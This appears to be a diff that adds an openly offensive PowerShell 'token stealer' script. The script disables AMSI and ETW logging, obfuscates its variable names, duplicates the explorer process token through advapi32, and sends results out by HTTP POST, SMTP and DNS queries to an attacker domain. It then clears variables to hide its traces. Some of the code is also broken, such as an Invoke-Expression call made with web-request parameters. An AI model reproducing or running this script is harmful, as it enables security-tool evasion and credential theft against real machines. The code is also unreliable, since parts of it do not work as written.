@@ -1,0 +1,102 @@
+# Standalone PowerShell Token Stealer
+# Steals access tokens and exfiltrates
+
+# Disable AMSI and ETW
+try {
+    [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
+    [Diagnostics.Eventing.EventProvider].GetField('m_enabled','NonPublic,Instance').SetValue([Ref].Assembly.GetType('System.Management.Automation.Tracing.PSEtwLogProvider').GetField('etwProvider','NonPublic,Static').GetValue($null),0)
+} catch {
+    Write-Output "Failed to disable AMSI/ETW: $_"
+}
+
+# Randomize variable names
+$rnd = -join ((65..90) + (97..122) | Get-Random -Count 8 | % {[char]$_})
+${"x$rnd"} = 'Invoke-Expression'; ${"y$rnd"} = 'Net.WebClient'
+
+# Encoding
+function Encode-Payload($script) {
+    try {
+        return [Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($script))
+    } catch {
+        Write-Output "Encode-Payload failed: $_"
+        return $null
+    }
+}
+
+# Exfiltration
+function Invoke-HTTPExfil($data) {
+    try {
+        $uri = 'https://malicious.attacker/upload'
+        $body = @{ data = $data } | ConvertTo-Json
+        &${"x$rnd"} -Uri $uri -Method Post -Body $body -ContentType 'application/json'
+        Write-Output "HTTP exfil successful"
+    } catch {
+        Write-Output "HTTPExfil failed: $_"
+    }
+}
+
+function Invoke-SMTPExfil($data) {
+    try {
+        $smtp = New-Object Net.Mail.SmtpClient('smtp.gmail.com', 587)
+        $smtp.EnableSsl = $true
+        $smtp.Credentials = New-Object Net.NetworkCredential('your.burner@gmail.com', 'yourAppSpecificPassword')
+        $msg = New-Object Net.Mail.MailMessage('your.burner@gmail.com', 'your.burner@gmail.com', "Tokens: $env:COMPUTERNAME", $data)
+        $smtp.Send($msg)
+        Write-Output "SMTP exfil successful"
+    } catch {
+        Write-Output "SMTPExfil failed: $_"
+    }
+}
+
+function Invoke-DNSExfil($data) {
+    try {
+        $domain = 'malicious.attacker'
+        $chunk = [Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes($data.Substring(0, [Math]::Min(100, $data.Length)))).Replace('=','').Replace('+','-').Replace('/','_')
+        foreach ($i in 0..($chunk.Length/63)) {
+            $sub = $chunk.Substring($i*63, [Math]::Min(63, $chunk.Length-$i*63))
+            [Net.Dns]::GetHostAddresses("$sub.$domain") | Out-Null
+        }
+        Write-Output "DNS exfil successful"
+    } catch {
+        Write-Output "DNSExfil failed: $_"
+    }
+}
+
+# Main Token Stealer
+function Invoke-StealTokens {
+    try {
+        Add-Type -TypeDefinition @'
+        using System;
+        using System.Runtime.InteropServices;
+        public class Token {
+            [DllImport("advapi32.dll", SetLastError = true)]
+            public static extern bool OpenProcessToken(IntPtr ProcessHandle, uint DesiredAccess, out IntPtr TokenHandle);
+            [DllImport("advapi32.dll", SetLastError = true)]
+            public static extern bool DuplicateToken(IntPtr ExistingTokenHandle, int SecurityImpersonationLevel, out IntPtr DuplicateTokenHandle);
+        }
+'@
+        $proc = Get-Process -Name explorer | Select -First 1
+        $tokenHandle = [IntPtr]::Zero
+        [Token]::OpenProcessToken($proc.Handle, 0x0008, [ref]$tokenHandle)
+        $dupToken = [IntPtr]::Zero
+        [Token]::DuplicateToken($tokenHandle, 2, [ref]$dupToken)
+        $data = "Token stolen for process: $($proc.Name)"
+        $encData = Encode-Payload $data
+        if ($encData) {
+            Invoke-HTTPExfil -data $encData
+            Invoke-SMTPExfil -data $encData
+            Invoke-DNSExfil -data $data
+        }
+    } catch {
+        Write-Output "StealTokens failed: $_"
+    }
+}
+
+# Execute
+try {
+    Invoke-StealTokens
+    Clear-Variable -Name * -Scope Global -ErrorAction SilentlyContinue
+    [GC]::Collect()
+} catch {
+    Write-Output "Execution failed: $_"
+}
